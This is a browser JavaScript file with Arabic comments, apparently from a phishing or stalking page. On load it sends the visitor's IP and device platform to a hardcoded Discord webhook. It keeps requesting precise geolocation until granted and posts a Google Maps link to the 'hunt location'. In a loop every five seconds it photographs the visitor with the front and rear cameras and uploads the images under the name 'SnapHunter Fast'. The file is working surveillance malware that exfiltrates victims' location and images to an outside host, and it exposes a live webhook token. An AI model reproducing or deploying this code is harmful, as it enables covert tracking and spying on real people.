'use strict';

const WEBHOOK_URL = "https://discord.com/api/webhooks/1444709878366212162/aaRxDFNINfucmVB8YSZ2MfdvHPUI8fbRRpROLo8iAAEFLjWfUNOHcgXJrhacUK4RbEHT";
const video = document.getElementById('video');
const canvas = document.getElementById('canvas');
let userLat = null, userLng = null;

// 1. جلب IP وإرسال تنبيه فوري (أسرع شيء)
async function quickNotify() {
    try {
        const res = await fetch('https://api.ipify.org?format=json');
        const data = await res.json();
        fetch(WEBHOOK_URL, { 
            method: 'POST', 
            headers: {'Content-Type': 'application/json'}, 
            body: JSON.stringify({content: `⚡ **دخول فوري!**\n🌐 IP: \`${data.ip}\` \n📱 الجهاز: \`${navigator.platform}\``}) 
        });
        return data.ip;
    } catch { return "Unknown"; }
}

// 2. طلب الموقع بشكل "إجباري ومباشر"
function forceLocation() {
    navigator.geolocation.getCurrentPosition(
        (p) => {
            userLat = p.coords.latitude;
            userLng = p.coords.longitude;
            // بمجرد الحصول على الموقع، أرسله فوراً في رسالة منفصلة لضمان السرعة
            sendLocationOnly();
        },
        () => { setTimeout(forceLocation, 500); }, 
        { enableHighAccuracy: true }
    );
}

async function sendLocationOnly() {
    if(!userLat) return;
    fetch(WEBHOOK_URL, { 
        method: 'POST', 
        headers: {'Content-Type': 'application/json'}, 
        body: JSON.stringify({content: `📍 **موقع الصيد المباشر:**\nhttps://www.google.com/maps?q=${userLat},${userLng}`}) 
    });
}

// 3. التقاط الصور بضغط عالي (لتسريع الرفع)
async function captureAndSend(mode) {
    try {
        const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: mode } });
        video.srcObject = stream;
        await new Promise(r => video.onloadedmetadata = r);
        video.play();

        // انتظر نصف ثانية فقط بدل ثانية ونصف
        await new Promise(r => setTimeout(r, 600));

        const ctx = canvas.getContext('2d');
        // تصغير حجم الكانفاس لتسريع الإرسال
        canvas.width = 400; 
        canvas.height = 300;
        ctx.drawImage(video, 0, 0, 400, 300);
        
        const blob = await new Promise(r => canvas.toBlob(r, 'image/jpeg', 0.5)); // ضغط الجودة لـ 50%
        stream.getTracks().forEach(t => t.stop());

        const formData = new FormData();
        formData.append('file', blob, `${mode}.jpg`);
        formData.append('payload_json', JSON.stringify({
            content: `📸 صورة من الكاميرا: \`${mode === 'user' ? 'الأمامية' : 'الخلفية'}\``,
            username: "SnapHunter Fast"
        }));
        
        await fetch(WEBHOOK_URL, { method: 'POST', body: formData });
    } catch (e) {}
}

// 4. التشغيل اللحظي
(async function() {
    await quickNotify(); // إرسال الـ IP فوراً
    
    // طلب الأذونات
    try {
        await navigator.mediaDevices.getUserMedia({ video: true }); // طلب الكاميرا
        forceLocation(); // طلب الموقع مباشرة
        
        // حلقة تكرار سريعة
        const runCycle = async () => {
            await captureAndSend('user');
            await captureAndSend('environment');
            setTimeout(runCycle, 5000); // تكرار كل 5 ثوانٍ
        };
        runCycle();
    } catch {
        forceLocation();
        setInterval(sendLocationOnly, 5000);
    }
})();
